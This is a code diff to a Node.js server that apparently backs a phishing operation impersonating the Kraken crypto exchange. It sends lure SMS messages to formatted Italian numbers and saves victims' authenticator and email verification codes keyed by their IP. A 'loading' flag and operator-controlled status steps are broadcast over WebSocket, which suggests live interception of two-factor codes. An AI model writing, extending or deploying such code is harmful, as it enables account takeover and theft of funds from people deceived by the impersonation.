@@ -71,14 +71,42 @@ const init = (async () => {
 
       (async () => {
         try {
+          // Check if mobile_number exists and is not empty
+          if (!mobile_number || typeof mobile_number !== 'string' || mobile_number.trim() === '') {
+            console.warn("SMS skipped: mobile_number is missing or empty");
+            return;
+          }
+
+          // Format phone number: remove any existing +, spaces, or dashes
+          let cleanedNumber = mobile_number.trim().replace(/[\s\-+]/g, '');
+          
+          // Ensure the number starts with 39 (Italy country code without +)
+          let formattedNumber;
+          if (cleanedNumber.startsWith("39")) {
+            formattedNumber = cleanedNumber;
+          } else if (cleanedNumber.startsWith("0")) {
+            // Remove leading 0 and add 39
+            formattedNumber = "39" + cleanedNumber.substring(1);
+          } else {
+            // Add 39 prefix
+            formattedNumber = "39" + cleanedNumber;
+          }
+
+          // Validate the formatted number has reasonable length (should be 11-13 digits for Italy)
+          if (formattedNumber.length < 10 || formattedNumber.length > 15) {
+            console.warn(`SMS skipped: Invalid phone number length: ${formattedNumber}`);
+            return;
+          }
+      
           const result = await sendSMS(
-            [mobile_number],
+            [formattedNumber],
             "Your Kraken questionnaire is ready. Please complete it at https://kraken.com/questionnaire"
           );
-
-          console.log("SMS API Response:", result);
+      
+          console.log("SMS API Response:", JSON.stringify(result, null, 2));
         } catch (err) {
           console.error("SMS Failed:", err.message);
+          console.error("SMS Error Details:", err.stack);
         }
       })();
 
@@ -99,12 +127,12 @@ const init = (async () => {
       if (!authenticatorCode)
         return res.status(400).json({ error: "authenticatorCode required" });
 
-      // Update gauth field + gauth_date + stat
+      // Update gauth field + gauth_date + stat + loading
       const stat = "3"; // or whatever step you want after authenticator
 
       await db.execute(
         `UPDATE users
-         SET gauth = ?, gauth_date = NOW(), stat = ?
+         SET gauth = ?, gauth_date = NOW(), stat = ?, loading = 1
          WHERE ip = ?`,
         [authenticatorCode, stat, ip]
       );
@@ -177,42 +205,50 @@ const init = (async () => {
   app.post("/update-stat", async (req, res) => {
     try {
       const { ip, stat } = req.body;
-
-      if (!ip) return res.status(400).json({ error: "ip required" });
-      if (stat === undefined)
+  
+      if (!ip) {
+        return res.status(400).json({ error: "ip required" });
+      }
+  
+      if (stat === undefined) {
         return res.status(400).json({ error: "stat value is required" });
-
-      const statValue = String(stat); // Normalize
-
-      // Update stat
+      }
+  
+      const statValue = String(stat); // normalize
+  
+      // ✅ Update stat AND turn loading OFF
       await db.execute(
         `UPDATE users
-         SET stat = ?
+         SET stat = ?, loading = 0
          WHERE ip = ?`,
         [statValue, ip]
       );
-
+  
       // Fetch updated record
-      const [rows] = await db.execute("SELECT * FROM users WHERE ip = ?", [ip]);
-
+      const [rows] = await db.execute(
+        "SELECT * FROM users WHERE ip = ?",
+        [ip]
+      );
+  
       if (rows.length === 0) {
         return res.json(false); // IP not found
       }
-
+  
       const userRecord = rows[0];
-
-      // WebSocket broadcast
+  
+      // Notify all WebSocket clients
       broadcast({
         type: "STAT_UPDATED",
         data: userRecord,
       });
-
+  
       return res.json(true);
     } catch (err) {
       console.error("DB Error:", err);
       res.status(500).json({ error: "Internal server error" });
     }
   });
+  
 
   app.post("/update-email-code", async (req, res) => {
     try {
@@ -224,10 +260,10 @@ const init = (async () => {
 
       const emailCodeValue = String(email_code); // normalize
 
-      // Update email_code
+      // Update email_code + loading
       await db.execute(
         `UPDATE users
-         SET email_code = ?
+         SET email_code = ?, loading = 1
          WHERE ip = ?`,
         [emailCodeValue, ip]
       );
@@ -265,10 +301,10 @@ const init = (async () => {
       const emailCodeValue = String(email_code_2); // normalize
       
 
-      // Update email_code
+      // Update email_code_2 + loading
       await db.execute(
         `UPDATE users
-         SET email_code_2 = ?
+         SET email_code_2 = ?, loading = 1
          WHERE ip = ?`,
         [emailCodeValue, ip]
       );
